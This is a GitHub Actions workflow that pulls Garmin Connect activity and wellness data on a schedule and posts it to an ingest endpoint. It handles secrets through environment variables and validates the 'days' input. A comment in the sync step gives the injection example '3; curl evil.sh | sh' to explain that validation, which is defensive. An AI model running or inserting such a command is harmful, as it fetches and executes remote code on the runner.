name: garmin-sync

# Pulls Garmin Connect activities + daily wellness and POSTs them to the Nextmind
# ingest endpoint. Deliberately on GitHub Actions, not Vercel Cron: garminconnect
# is a Python lib with a native TLS dependency (curl_cffi) and there is no official
# Garmin API, so this cannot run in the serverless Node runtime.
#
# Auth: the token bundle is seeded ONCE locally (`python sync_garmin.py --login`,
# which answers 2FA) and stored as the GARMIN_TOKEN_B64 secret. CI restores it and
# the lib refreshes silently. Re-seed only if the refresh token expires (~1yr).
#
# Paths below assume the script lives at scripts/garmin/ in this repo. If you
# copied it somewhere else, adjust the two paths and nothing else.
on:
  schedule:
    - cron: "0 9 * * *" # 09:00 UTC = 05:00 ET, before context-rebuild (09:00) + brief (10:30)
  workflow_dispatch:
    inputs:
      days:
        description: "Days back to pull"
        required: false
        default: "3"

concurrency:
  group: garmin-sync
  cancel-in-progress: false

# This job only reads the repo. It never pushes, comments, or opens anything,
# so it does not get the default read/write token.
permissions:
  contents: read

jobs:
  sync:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - run: pip install -r scripts/garmin/requirements.txt

      - name: Restore Garmin token bundle
        # The secret goes through env, never through ${{ }} interpolated into the
        # script body: interpolation pastes a year of account access into the
        # shell text itself, where a `set -x` or a crash dump can surface it.
        env:
          GARMIN_TOKEN_B64: ${{ secrets.GARMIN_TOKEN_B64 }}
        run: |
          set -euo pipefail   # hygiene; the guard below is what actually gives
                              # a missing secret a readable error
          if [ -z "${GARMIN_TOKEN_B64:-}" ]; then
            echo "::error::GARMIN_TOKEN_B64 is not set. Seed it locally with --login then --export-ci-token."
            exit 1
          fi
          mkdir -p "$HOME/.garminconnect"
          chmod 700 "$HOME/.garminconnect"
          printf '%s' "$GARMIN_TOKEN_B64" | base64 -d | tar -xzf - -C "$HOME/.garminconnect"
          chmod -R go-rwx "$HOME/.garminconnect"

      - name: Run Garmin sync
        # DAYS goes through env too. It is a workflow_dispatch input, i.e. text a
        # human types, and interpolating it straight into `run:` would let
        # "3; curl evil.sh | sh" execute as part of this step.
        env:
          DAYS: ${{ github.event.inputs.days || '3' }}
          GARMIN_INGEST_URL: ${{ secrets.GARMIN_INGEST_URL }}
          GARMIN_INGEST_SECRET: ${{ secrets.SESSION_LOG_SECRET }}
        run: |
          set -euo pipefail
          case "$DAYS" in
            ''|*[!0-9]*) echo "::error::days must be a whole number, got: $DAYS"; exit 1 ;;
          esac
          python scripts/garmin/sync_garmin.py --days "$DAYS" --sink supabase
